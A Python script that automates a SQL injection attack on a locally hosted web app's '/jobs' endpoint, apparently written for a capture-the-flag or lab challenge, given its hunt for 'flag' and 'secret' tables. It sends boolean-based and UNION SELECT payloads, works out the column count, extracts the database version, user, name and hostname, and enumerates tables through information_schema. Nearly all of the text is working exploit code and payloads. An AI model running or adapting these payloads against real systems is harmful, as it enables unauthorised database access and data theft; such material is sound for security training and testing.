import requests
import json
import re
import time

# Configuration
BASE_URL = "http://127.0.0.1:8000"
ENDPOINT = "/jobs"
TARGET_URL = BASE_URL + ENDPOINT

# Helper function to send SQL injection payload
def send_payload(payload):
    """Send SQL injection payload via POST request"""
    headers = {'Content-Type': 'application/json'}
    data = {"jobtype": payload}
    
    try:
        response = requests.post(TARGET_URL, headers=headers, data=json.dumps(data), timeout=10)
        return response
    except Exception as e:
        print(f"[!] Error sending request: {e}")
        return None

# Helper to extract data from response
def extract_data(response):
    """Extract relevant data from response"""
    if response is None:
        return None
    
    print(f"Status: {response.status_code}")
    
    # Try to extract data from various response formats
    response_text = response.text
    
    # Look for JSON responses
    try:
        json_data = response.json()
        print(f"JSON Response: {json.dumps(json_data, indent=2)}")
        return json_data
    except:
        print(f"Raw Response: {response_text[:500]}{'...' if len(response_text) > 500 else ''}")
        
    return response_text

# Step 1: Confirm vulnerability is working
print("=" * 60)
print("STEP 1: Confirming SQL Injection Vulnerability")
print("=" * 60)

# Test basic injection - boolean-based
test_payloads = [
    "test' OR '1'='1",
    "test' AND 1=1-- ",
    "test' AND 1=2-- ",
]

for payload in test_payloads:
    print(f"\n[+] Testing payload: {payload}")
    response = send_payload(payload)
    if response:
        extract_data(response)
        time.sleep(0.5)

# Step 2: Determine number of columns for UNION
print("\n" + "=" * 60)
print("STEP 2: Determining number of columns")
print("=" * 60)

# Try UNION with increasing columns
col_count = None
for i in range(1, 21):
    payload = f"test' UNION SELECT {', '.join(['NULL'] * i)}-- "
    print(f"[+] Testing {i} columns...")
    response = send_payload(payload)
    
    if response and response.status_code != 500:
        # Check if response is different from error
        print(f"Success with {i} columns!")
        col_count = i
        extract_data(response)
        break
    time.sleep(0.3)

if not col_count:
    print("[!] Could not determine column count, trying alternative approach...")
    # Fallback: try with ORDER BY to count columns
    for i in range(1, 51):
        payload = f"test' ORDER BY {i}-- "
        response = send_payload(payload)
        if response and (response.status_code == 500 or "error" in response.text.lower()):
            col_count = i - 1
            print(f"[+] Detected {col_count} columns using ORDER BY")
            break
        time.sleep(0.1)

if col_count:
    print(f"[+] Column count confirmed: {col_count}")
else:
    print("[!] Could not determine column count, proceeding with common values...")
    col_count = 5  # Common default

# Step 3: Extract database information
print("\n" + "=" * 60)
print("STEP 3: Extracting Database Information")
print("=" * 60)

# Database version
db_payloads = {
    "version": f"test' UNION SELECT @@version, {', '.join(['NULL'] * (col_count - 1))}-- ",
    "user": f"test' UNION SELECT user(), {', '.join(['NULL'] * (col_count - 1))}-- ",
    "database": f"test' UNION SELECT database(), {', '.join(['NULL'] * (col_count - 1))}-- ",
    "hostname": f"test' UNION SELECT @@hostname, {', '.join(['NULL'] * (col_count - 1))}-- "
}

db_info = {}
for key, payload in db_payloads.items():
    print(f"\n[+] Extracting {key}...")
    response = send_payload(payload)
    if response and response.status_code == 200:
        data = extract_data(response)
        db_info[key] = data
    time.sleep(0.5)

# Step 4: Enumerate tables
print("\n" + "=" * 60)
print("STEP 4: Enumerating Tables")
print("=" * 60)

# Get table names from information_schema
# Common approach: SELECT table_name FROM information_schema.tables WHERE table_schema=database()
tables_payload = f"test' UNION SELECT table_name, {', '.join(['NULL'] * (col_count - 1))} FROM information_schema.tables WHERE table_schema=database()-- "

print("[+] Extracting table names...")
response = send_payload(tables_payload)
table_names = []

if response and response.status_code == 200:
    data = extract_data(response)
    # Try to extract table names from response
    response_text = response.text.lower()
    
    # Look for common flag table patterns
    common_flag_tables = ['flag', 'flags', 'secret', 'secrets', 'config', 'settings']
    
    # Extract potential table names (simple pattern matching)
    if 'flag' in response_text:
        table_names.append('flag')
    if 'flags' in response_text:
        table_names.append('flags')
    if 'secret' in response_text:
        table_names.append('secret')
    if 'secrets' in response_text:
        table_names.append('secrets')
    
    print(f"[+] Potentially interesting tables: {table_names}")
